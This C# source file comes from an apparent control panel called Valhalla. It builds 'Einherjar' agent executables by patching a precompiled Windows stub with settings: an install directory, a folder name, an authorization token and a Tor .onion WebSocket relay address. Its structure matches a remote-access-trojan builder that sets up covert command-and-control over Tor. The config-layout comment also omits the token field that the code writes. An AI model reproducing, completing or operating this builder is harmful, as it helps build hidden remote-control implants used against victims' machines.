using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace Valhalla
{
    /// <summary>
    /// Identifies the build variant of the Einherjar agent stub.
    /// <para>
    /// Release — production build: no debug output, identical functionality.
    ///           Corresponds to <c>stub.bin</c>.
    /// Debug   — diagnostic build: structured [DEBUG] logging to stderr,
    ///           identical functionality.  Corresponds to <c>stub_debug.bin</c>.
    /// </para>
    /// </summary>
    internal enum AgentBuildVariant
    {
        Release,
        Debug,
    }

    internal static class AgentBuildService
    {
        // Dedicated patchable configuration slot. This must match
        // CONFIG_SLOT_MARKER / CONFIG_SLOT_SIZE in agent/src/stub.rs exactly.
        private static readonly byte[] ConfigSlotMarker = Encoding.ASCII.GetBytes(
            "VALHALLA-EINHERJAR-CFG-SLOT-V1\0\0");
        private const int ConfigSlotSize = 4096;
        private const int ConfigSlotHeaderSize = 32 + 4;

        private static readonly Regex OnionEndpoint = new Regex(
            @"^ws://(?<host>[a-z2-7]{56})\.onion:(?<port>[1-9][0-9]{0,4})(?<path>/[^\s]*)?$",
            RegexOptions.IgnoreCase | RegexOptions.CultureInvariant);

        /// <summary>
        /// Copies the appropriate stub template (<c>stub.bin</c> or
        /// <c>stub_debug.bin</c>) to <paramref name="outputPath"/> and patches
        /// the configuration block into the copy.  The original stub files are
        /// never modified.
        /// </summary>
        /// <param name="variant">
        /// <see cref="AgentBuildVariant.Release"/> uses <c>stub.bin</c> and
        /// produces a production agent without diagnostic output.
        /// <see cref="AgentBuildVariant.Debug"/> uses <c>stub_debug.bin</c> and
        /// produces a diagnostics-enabled agent that logs to stderr.
        /// </param>
        public static void PatchAndDeploy(string onionAddress, int installDirectory,
                                          string folderName, string agentToken,
                                          string outputPath,
                                          AgentBuildVariant variant = AgentBuildVariant.Release)
        {
            string normalizedEndpoint = ValidateOnionAddress(onionAddress);
            if (installDirectory < 0 || installDirectory > 4)
                throw new ArgumentOutOfRangeException(nameof(installDirectory),
                    "Install directory index must be 0–4.");
            if (string.IsNullOrWhiteSpace(folderName))
                folderName = "Einherjar";

            string stubPath = LocateStub(variant);

            // Verify the source is a Windows PE.
            using (FileStream verify = File.OpenRead(stubPath))
            {
                if (verify.Length < 2)
                    throw new InvalidDataException(
                        $"{Path.GetFileName(stubPath)} is too small to be a valid PE.");
                int b0 = verify.ReadByte(), b1 = verify.ReadByte();
                if (b0 != 'M' || b1 != 'Z')
                    throw new InvalidDataException(
                        $"{Path.GetFileName(stubPath)} is not a valid Windows PE executable (missing MZ header).");
            }

            // Read the clean template — never touch this file again after reading.
            byte[] image = File.ReadAllBytes(stubPath);

            // Build the configuration block.
            if (string.IsNullOrWhiteSpace(agentToken))
                throw new ArgumentException("Relay agent authorization token is required.", nameof(agentToken));
            byte[] block = BuildConfigBlock(installDirectory, folderName, normalizedEndpoint, agentToken);

            // Locate the dedicated patch slot. Never fall back to a generic magic
            // search: the marker also appears in parser constants and test fixtures.
            int slotOffset = FindConfigSlot(image);
            if (slotOffset < 0)
                throw new InvalidDataException(
                    $"{Path.GetFileName(stubPath)} does not contain the dedicated Einherjar configuration slot. " +
                    "Rebuild the agent stub from the current source.");

            int payloadOffset = slotOffset + ConfigSlotHeaderSize;
            int payloadCapacity = ReadInt32LittleEndian(image, slotOffset + ConfigSlotMarker.Length);
            if (payloadCapacity <= 0 || payloadCapacity > ConfigSlotSize - ConfigSlotHeaderSize)
                throw new InvalidDataException(
                    $"{Path.GetFileName(stubPath)} contains an invalid Einherjar configuration slot capacity.");
            if (payloadOffset > image.Length || payloadOffset + payloadCapacity > image.Length)
                throw new InvalidDataException(
                    $"{Path.GetFileName(stubPath)} configuration slot extends beyond the executable image.");
            if (block.Length > payloadCapacity)
                throw new InvalidDataException(
                    $"{Path.GetFileName(stubPath)} configuration region is too small to hold the current settings.");

            // Always clear the complete payload area before writing. This prevents
            // stale bytes from a previous configuration from becoming part of the
            // parsed token/string data.
            Array.Clear(image, payloadOffset, payloadCapacity);
            Buffer.BlockCopy(block, 0, image, payloadOffset, block.Length);

            // Write the patched image to the user-chosen output path.
            string dir = Path.GetDirectoryName(Path.GetFullPath(outputPath));
            if (!string.IsNullOrWhiteSpace(dir))
                Directory.CreateDirectory(dir);

            // Atomic-ish write: write to a temp file then move.
            string tmp = outputPath + ".tmp";
            File.WriteAllBytes(tmp, image);
            if (File.Exists(outputPath)) File.Delete(outputPath);
            File.Move(tmp, outputPath);
        }


        public static string DeriveAgentToken(string relaySecret)
        {
            if (string.IsNullOrEmpty(relaySecret))
                throw new ArgumentException("Relay authentication secret is required to derive the agent token.", nameof(relaySecret));
            using (var hmac = new HMACSHA256(Encoding.ASCII.GetBytes(relaySecret)))
            {
                byte[] material = Encoding.ASCII.GetBytes("VALHALLA-AGENT-AUTH-V1\0");
                return BitConverter.ToString(hmac.ComputeHash(material)).Replace("-", string.Empty).ToLowerInvariant();
            }
        }

        public static string ValidateOnionAddress(string value)
        {
            string endpoint = (value ?? string.Empty).Trim();
            Match match = OnionEndpoint.Match(endpoint);
            if (!match.Success)
                throw new ArgumentException(
                    "Onion address must be a ws:// v3 onion endpoint such as " +
                    "ws://<56-character-onion-host>:443/valhalla.", nameof(value));
            int port = int.Parse(match.Groups["port"].Value,
                System.Globalization.CultureInfo.InvariantCulture);
            if (port < 1 || port > 65535)
                throw new ArgumentException(
                    "Onion endpoint port must be between 1 and 65535.", nameof(value));
            return endpoint;
        }

        // ── Internal helpers ─────────────────────────────────────────────────

        /// <summary>
        /// Builds the raw byte payload stored after the dedicated configuration
        /// slot header (the slot marker and 4-byte capacity are not included):
        ///   [0]         install_dir : u8
        ///   [1..2]      folder_len  : u16 LE
        ///   [3..]       folder_name : UTF-8
        ///   [n+0..n+1]  onion_len   : u16 LE
        ///   [n+2..]     onion       : UTF-8
        /// Must match the parser in agent/src/stub.rs exactly.
        /// </summary>
        private static byte[] BuildConfigBlock(int installDir, string folderName, string onion, string agentToken)
        {
            byte[] folderBytes = Encoding.UTF8.GetBytes(folderName);
            byte[] onionBytes  = Encoding.UTF8.GetBytes(onion);
            byte[] tokenBytes  = Encoding.UTF8.GetBytes(agentToken.Trim());

            if (folderBytes.Length > 260)
                throw new ArgumentException("Folder name is too long (max 260 UTF-8 bytes).");
            if (onionBytes.Length > 512)
                throw new ArgumentException("Onion address is too long (max 512 UTF-8 bytes).");
            if (tokenBytes.Length == 0 || tokenBytes.Length > 256)
                throw new ArgumentException("Relay agent authorization token must be 1–256 UTF-8 bytes.");

            using (var ms = new MemoryStream())
            using (var bw = new BinaryWriter(ms, Encoding.UTF8, leaveOpen: true))
            {
                bw.Write((byte)installDir);
                bw.Write((ushort)folderBytes.Length);
                bw.Write(folderBytes);
                bw.Write((ushort)onionBytes.Length);
                bw.Write(onionBytes);
                bw.Write((ushort)tokenBytes.Length);
                bw.Write(tokenBytes);
                bw.Flush();
                return ms.ToArray();
            }
        }

        private static int FindConfigSlot(byte[] image)
        {
            int limit = image.Length - ConfigSlotMarker.Length - 4;
            if (limit < 0) return -1;
            limit = Math.Min(limit, (64 * 1024 * 1024) - ConfigSlotMarker.Length - 4);

            for (int i = 0; i <= limit; i++)
            {
                bool match = true;
                for (int j = 0; j < ConfigSlotMarker.Length && match; j++)
                    match = image[i + j] == ConfigSlotMarker[j];
                if (!match) continue;

                int capacity = ReadInt32LittleEndian(image, i + ConfigSlotMarker.Length);
                if (capacity != ConfigSlotSize - ConfigSlotHeaderSize) continue;
                if (i + ConfigSlotHeaderSize + capacity > image.Length) continue;

                // The template reserves the entire payload as zeroes. Requiring
                // a small zero prefix prevents accidental matches on code/data
                // constants containing the marker text.
                bool blankPrefix = true;
                int check = Math.Min(16, capacity);
                for (int j = 0; j < check; j++)
                {
                    if (image[i + ConfigSlotHeaderSize + j] != 0)
                    {
                        blankPrefix = false;
                        break;
                    }
                }
                if (blankPrefix) return i;
            }
            return -1;
        }

        private static int ReadInt32LittleEndian(byte[] image, int offset)
        {
            return image[offset]
                | (image[offset + 1] << 8)
                | (image[offset + 2] << 16)
                | (image[offset + 3] << 24);
        }

        /// <summary>
        /// Returns the path to the stub template for the requested build variant.
        /// <para>
        /// Search order: VALHALLA_STUB_PATH env override (for both variants),
        /// then <c>stub\stub_debug.bin</c> / <c>stub\stub.bin</c> walking up
        /// from the panel executable directory.
        /// </para>
        /// </summary>
        private static string LocateStub(AgentBuildVariant variant)
        {
            string stubFilename = variant == AgentBuildVariant.Debug ? "stub_debug.bin" : "stub.bin";

            // 1. Explicit environment override (applies to both variants).
            string env = Environment.GetEnvironmentVariable("VALHALLA_STUB_PATH");
            if (!string.IsNullOrWhiteSpace(env))
            {
                // If the override points directly at a file, use it.
                if (File.Exists(env)) return Path.GetFullPath(env);
                // If it points at a directory, look for the variant filename inside it.
                string candidate = Path.Combine(env, stubFilename);
                if (File.Exists(candidate)) return Path.GetFullPath(candidate);
            }

            // 2. Walk up from the panel executable directory looking for stub\<filename>.
            DirectoryInfo current = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
            for (int depth = 0; current != null && depth < 8; depth++, current = current.Parent)
            {
                string candidate = Path.Combine(current.FullName, "stub", stubFilename);
                if (File.Exists(candidate)) return candidate;
            }

            throw new FileNotFoundException(
                $"{stubFilename} was not found. Place the pre-compiled Einherjar binary at " +
                $"stub\\{stubFilename} alongside the panel executable, or set VALHALLA_STUB_PATH.\n\n" +
                (variant == AgentBuildVariant.Debug
                    ? "stub_debug.bin is built with the debug-log Cargo feature enabled. " +
                      "Build it with: cargo build --profile release-debug --features debug-log"
                    : "stub.bin is built with: cargo build --release"));
        }
    }
}
